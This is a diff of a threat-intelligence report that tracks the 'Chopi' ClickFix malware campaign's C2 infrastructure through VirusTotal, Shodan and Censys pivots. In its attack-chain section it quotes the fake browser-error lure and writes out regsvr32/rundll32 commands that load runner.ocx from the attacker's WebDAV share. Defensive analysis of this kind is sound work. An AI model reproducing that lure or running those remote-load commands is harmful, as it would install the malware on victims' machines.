@@ -41,9 +41,9 @@ Here's what we discovered in our initial Virus Total analysis on the C2 domain.
 | `xtrafftrck[.]net` | 20/91 | `70.34.205[.]43`, `208.85.17[.]52` |
 
 ## Virus Total - C2 IP Pivot
-The front page is painted red! With 16 out of 91 security vendors flagging the domain as malicious. Digging into the details tab, we find a public IP address associated with our malware's C2. 
+The front page is painted red with 16 out of 91 security vendors flagging the domain as malicious. Digging into the details tab, we find a public IP address associated with our malware's C2. 
 
-We've also uncovered interesting tags assocaited with this IP. The tags were submitted by a community researcher named `JaffaCakes118`. The researcher attributes `Chopi` as a campaign tag. We'll look into this tag later in the report.
+We've also uncovered interesting tags associated with this IP. The tags were submitted by a community researcher named `JaffaCakes118`. The researcher attributes `Chopi` as a campaign tag. We'll look into this tag later in the report.
 
 Tags: `chopi` `ClickFix` `ixwebsocket` `ocx` `WebDav` `Unknown_malware` 
 
@@ -60,7 +60,7 @@ Pivoting on 70.34.205[.]43 uncovers 4 additional domains, potentially linking to
 
 ## Shodan.io
 
-Before diving into our newly discovered domains, let's lookup the IP 70.34.205[.]43 in Shodan. Shodan is search engine for the internet of everything. If it's online, it's in Shodan. After plugging in the IP, we're presented with two domains screenly[.]cam and vulltrusercontent[.]com.
+Before diving into our newly discovered domains, let's lookup the IP 70.34.205[.]43 in Shodan. Shodan is a search engine for the internet of everything. If it's online, it's in Shodan. After plugging in the IP, we're presented with two domains screenly[.]cam and vulltrusercontent[.]com.
 The later is a VPS hosting service. It provides the infrastructure for screenly[.]cam and xtraffck[.]net. 
 
 A quick search on the Vultr hosting service reveals it's cheap, accepts crypto, has low identification requirements and is commonly used by threat actors. It's most likely not worth pivoting into this domain. What does seem interesting is screenly, we've now seen this domain across two different tools.
@@ -83,17 +83,17 @@ A quick search on the Vultr hosting service reveals it's cheap, accepts crypto, 
 | `4000` | Unknown | `HTTP/1.1 400 Bad Request — Connection: close` |
 
 ## Screenly[.]cam 
-Shodan provided a wealth of information. It revealed open port 3000, running a monitoring software named `Chopi Monitoring Dashboard`, which I believe is used for C2 management. The name Chopi ties back to the campaign tag identified by the community researcher on VirusTotal. Port 4000 is an interesting find, possibly expecting a specific key, header, or handshake before responding, as it currently returns a Bad Request error. Port 22 is standard for Vultr hosted infrastructure.
+Shodan provided a wealth of information. It revealed open port 3000, running a monitoring software named `Chopi Monitoring Dashboard`, which I believe is used for C2 management. The name `Chopi` ties back to the campaign tag identified by the community researcher on Virus Total. Port 4000 is an interesting find, possibly expecting a specific key, header, or handshake before responding, as it currently returns a Bad Request error. Port 22 is standard for Vultr hosted infrastructure.
 
 The HTTPS certificate thumbprint is an interesting artifact. Let's see what it reveals to us. We'll use another tool called Censys to investigate the certificate.
 
 ## Censys - Screenly HTTPs Certificate Thumbprint 
 Earlier in VirusTotal, we identified several domains associated with the C2 IP address. Inputting the HTTPS certificate thumbprint `f6be95351f72b24e1232c138f426aa612864696f` into Censys reveals a significant finding. The threat actor reused the screenly[.]cam certificate for aurekh[.]com, confirming shared operator ownership. As noted in our VirusTotal table, aurekh[.]com was already associated with our C2 IP address.
 
-I searched Censys for the other domains Virus Total provided but found no certificate reuse. between them.
+I searched Censys for the other domains Virus Total provided but found no certificate reuse.
 
 ## Virus Total - Screenly
-Let's go back to Virus Total and review screenly[.]cam. This time let's look at the community notes provided by `JaffaCakes118`. He references the tags seen below. They look oddly similar to the tags we saw on our C2 domain earlier.
+Let's go back to Virus Total and review screenly[.]cam. This time let's look at the community notes provided by `JaffaCakes118`. He references the tags seen below. They look oddly similar to the tags we saw on our C2 domain.
 
 Tags: `chopi` `ClickFix` `ixwebsocket` `ocx` `WebDav` `Unknown_malware`
 
@@ -105,27 +105,48 @@ We've seen similar tags now between our C2 domain and screenly[.]cam. Let's do a
 
 Check out the results! Threat researcher `Lenny_3BO` has already submitted his own findings for the `Chopi` malware campaign. Comparing his submissions against our malware sample reveals overlapping malicious domains and IPs. Very cool!
 
-## Attack Chain
+## WebDav Tag
 
-WebDav is a new concept I've come to learn in my analysis. The attack chain typically starts with a phishing email carrying a URL file or an LNK. When executed, Windows silently mounts the remote WebDAV share and the payload is loaded directly into memory, bypassing the local filesystem entirely. No file write, no Mark of the Web (MotW), no SmartScreen prompt. That last part is the real win for the attacker.
+WebDav is a new concept I've come to learn in my analysis. Here's what Claude taught me.
 
-The full delivery chain was reconstructed from ThreatFox IOC submissions and infrastructure analysis.
+````
+WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.
+````
+# Attack Chain
+During static analysis of runner.ocx, we identified an exported function named DllInstall containing the malware payload. Combining that with our threat intelligence, we can map out what the attack chain looks like in execution.
 
-```
-Victim receives LNK file (WebDAV delivered)
+## The Phish
+The victim is phished, usually via email. They download an attachment or follow a link within an email. That link brings them to the malicious clickfix website  (i.e, screenly[.]cam). On the clickfix website, the victim is presented with a message.
+````
+"An error occurred verifying your browser. To fix this, press Windows + R, paste the code below, and press Enter."
+````
+The victim is requested to copy code which may be base64 encoded or plaintext like the example below. 
+````
+regsvr32.exe \\xtrafftrck.net@80\files\runner.ocx
+or
+rundll32.exe \\xtrafftrck.net@80\files\runner.ocx,DllInstall
+````
+## The Attack
+Here's what happens.
+````
+1. regsvr32.exe or rundll32.exe receives the UNC path as an argument.
 
-LNK executes ClickFix lure via screenly[.]cam/s/
+2. Windows WebClient service mounts \\xtrafftrck.net@80 as a virtual network share over HTTP.
 
-Victim shown fake page, instructed to paste command
+3. regsvr32.exe loads runner.ocx directly into its own process memory from the remote share.
 
-Command runs regsvr32 pulling updater.ocx from xtrafftrck[.]net/files/
+4. DllInstall is called, which is the malware entry point.
 
-DllInstall validates internal checks
+5. The implant is now executing in memory.
+````
+## Command and Control
+Now that the malware has executed, the C2 is called and the operator controls the victim's computer.
 
+````
 AgentThread beacons to xtrafftrck[.]net:3000/ws/agent
 
-Operator manages victims via Chopi Monitoring Dashboard
-```
+Operator manages victim computer via Chopi Monitoring Dashboard
+````
 
 ## Conclusion
 During our threat intelligence campaign, we used various web tools to bring together disparate artifacts. Togther hey map out the attackers infrastructure, attack patterns and Opsec strengths and weaknesses. Small mistakes in operator security, like certificate reuse and consistent infrastructure patterns, are what ultimately expose a threat actor's full campaign.
